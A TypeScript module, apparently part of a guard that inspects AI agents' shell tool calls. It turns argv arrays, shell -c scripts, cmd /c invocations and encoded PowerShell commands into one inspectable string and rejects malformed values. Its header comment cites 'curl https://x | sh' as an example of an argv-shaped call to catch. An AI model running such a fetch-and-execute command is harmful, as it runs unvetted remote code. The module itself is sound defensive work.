/**
 * Shell tool calls do not always carry a command *string*. Codex's
 * `shell`/`local_shell`/`exec` tools, and several other hosts, send an argv
 * array such as `["bash", "-lc", "curl https://x | sh"]`. Inspecting only
 * string commands would let an argv-shaped call reach the evaluator with no
 * artifacts and be allowed without inspection.
 *
 * This module turns a command value of either shape into the one string the
 * detection core inspects:
 *   - a string is returned unchanged;
 *   - a shell invocation (`bash -lc <script>`, `sh -c <script>`,
 *     `env FOO=1 /bin/zsh -c <script>`, `cmd /c …`, `pwsh -Command …`) yields
 *     the script the shell will run, followed by any positional arguments
 *     handed to it (a `-c` script can `eval "$1"`, so those are inspected too);
 *   - any other argv is shell-quoted and joined into a single command line.
 *
 * Anything else — a number, object, `null`, an empty array, or an array with
 * a non-string element — is malformed: the host's executed command cannot be
 * known, so callers must deny rather than treat the call as having nothing to
 * inspect.
 */

export type CommandValueResult =
	| { ok: true; command: string; argv?: readonly string[] }
	| { ok: false; reason: "malformed_command" };

/** POSIX-style shells that accept `-c <script>`. */
const POSIX_SHELLS = new Set(["sh", "bash", "zsh", "ksh", "dash", "ash", "mksh", "yash", "fish"]);
const CMD_SHELLS = new Set(["cmd", "cmd.exe"]);
const POWERSHELLS = new Set(["powershell", "powershell.exe", "pwsh", "pwsh.exe"]);

/** POSIX shell options that consume the following argv element. */
const POSIX_OPTIONS_WITH_ARGUMENT = new Set(["-o", "+o", "-O", "+O", "--rcfile", "--init-file"]);

const SAFE_SHELL_WORD = /^[A-Za-z0-9_@%+=:,./-]+$/;
const ENV_ASSIGNMENT = /^[A-Za-z_][A-Za-z0-9_]*=/;

/** Quote one argv element so the joined line re-parses to the same word. */
export function shellQuote(arg: string): string {
	if (arg !== "" && SAFE_SHELL_WORD.test(arg)) return arg;
	return `'${arg.replaceAll("'", `'\\''`)}'`;
}

function basename(executable: string): string {
	const parts = executable.split(/[\\/]/);
	return (parts[parts.length - 1] ?? executable).toLowerCase();
}

/** Skip an `env [-i] [-u NAME] [NAME=VALUE]...` prefix; undefined when not understood. */
function skipEnvPrefix(argv: readonly string[]): number | undefined {
	let index = 1;
	while (index < argv.length) {
		const arg = argv[index] as string;
		if (arg === "-i" || arg === "-" || arg === "--ignore-environment" || arg === "-0") {
			index++;
		} else if (arg === "-u" || arg === "--unset") {
			index += 2;
		} else if (arg.startsWith("--unset=") || ENV_ASSIGNMENT.test(arg)) {
			index++;
		} else if (arg === "--") {
			return index + 1;
		} else if (arg.startsWith("-")) {
			// `-S`/`--split-string` and other options change how the rest is
			// parsed; the joined argv is inspected instead.
			return undefined;
		} else {
			return index;
		}
	}
	return undefined;
}

/**
 * Script run by a POSIX shell invocation, or undefined when the argv does not
 * pass `-c` (e.g. `bash script.sh`), in which case the joined argv is inspected.
 */
// biome-ignore lint/complexity/noExcessiveCognitiveComplexity: one linear scan over POSIX shell option forms
function posixShellScript(argv: readonly string[], start: number): string | undefined {
	let hasCommandFlag = false;
	let index = start;
	while (index < argv.length) {
		const arg = argv[index] as string;
		if (arg === "--" || arg === "-") {
			index++;
			break;
		}
		if (POSIX_OPTIONS_WITH_ARGUMENT.has(arg)) {
			index += 2;
			continue;
		}
		if (arg === "--command") {
			hasCommandFlag = true;
			index++;
			continue;
		}
		if (arg.startsWith("--")) {
			index++;
			continue;
		}
		if (/^[-+][A-Za-z]+$/.test(arg)) {
			if (arg.startsWith("-") && arg.includes("c")) hasCommandFlag = true;
			index++;
			continue;
		}
		break;
	}
	if (!hasCommandFlag || index >= argv.length) return undefined;
	const script = argv[index] as string;
	// Positional parameters ($0, $1, …) are reachable from the script through
	// `eval "$1"` and friends, so they are inspected as command text as well.
	const positional = argv.slice(index + 1);
	return positional.length > 0 ? [script, ...positional].join("\n") : script;
}

function cmdScript(argv: readonly string[], start: number): string | undefined {
	for (let index = start; index < argv.length; index++) {
		const flag = (argv[index] as string).toLowerCase();
		if (flag === "/c" || flag === "/k" || flag === "/r") {
			const rest = argv.slice(index + 1);
			return rest.length > 0 ? rest.join(" ") : undefined;
		}
		if (!flag.startsWith("/")) return undefined;
	}
	return undefined;
}

function decodePowerShellEncodedCommand(value: string): string | undefined {
	if (!/^[A-Za-z0-9+/]+={0,2}$/.test(value)) return undefined;
	const decoded = Buffer.from(value, "base64").toString("utf16le");
	return decoded.trim() === "" ? undefined : decoded;
}

function powerShellScript(argv: readonly string[], start: number): string | undefined {
	for (let index = start; index < argv.length; index++) {
		const flag = (argv[index] as string).toLowerCase();
		if (flag === "-command" || flag === "-c" || flag === "/command" || flag === "/c") {
			const rest = argv.slice(index + 1);
			return rest.length > 0 ? rest.join(" ") : undefined;
		}
		if (
			flag === "-encodedcommand" ||
			flag === "-enc" ||
			flag === "-e" ||
			flag === "-ec" ||
			flag === "/encodedcommand"
		) {
			const encoded = argv[index + 1];
			return encoded === undefined ? undefined : decodePowerShellEncodedCommand(encoded);
		}
	}
	return undefined;
}

/**
 * Convert a host argv array into the command text the core inspects. Returns
 * undefined for an array that is not a well-formed argv.
 */
export function commandFromArgv(argv: readonly unknown[]): string | undefined {
	if (argv.length === 0) return undefined;
	if (!argv.every((arg): arg is string => typeof arg === "string")) return undefined;
	const words = argv as readonly string[];
	if ((words[0] as string).trim() === "") return undefined;

	let start = 0;
	if (basename(words[0] as string) === "env") {
		const skipped = skipEnvPrefix(words);
		if (skipped !== undefined && skipped < words.length) start = skipped;
	}
	const program = basename(words[start] as string);
	let script: string | undefined;
	if (POSIX_SHELLS.has(program)) script = posixShellScript(words, start + 1);
	else if (CMD_SHELLS.has(program)) script = cmdScript(words, start + 1);
	else if (POWERSHELLS.has(program)) script = powerShellScript(words, start + 1);

	return script ?? words.map(shellQuote).join(" ");
}

/**
 * Normalize a shell tool's `command` value. Strings pass through unchanged;
 * argv arrays are converted with {@link commandFromArgv}; everything else is
 * malformed and must be denied by the caller.
 */
export function commandFromValue(value: unknown): CommandValueResult {
	if (typeof value === "string") return { ok: true, command: value };
	if (Array.isArray(value)) {
		const command = commandFromArgv(value);
		if (command !== undefined) return { ok: true, command, argv: value as string[] };
	}
	return { ok: false, reason: "malformed_command" };
}
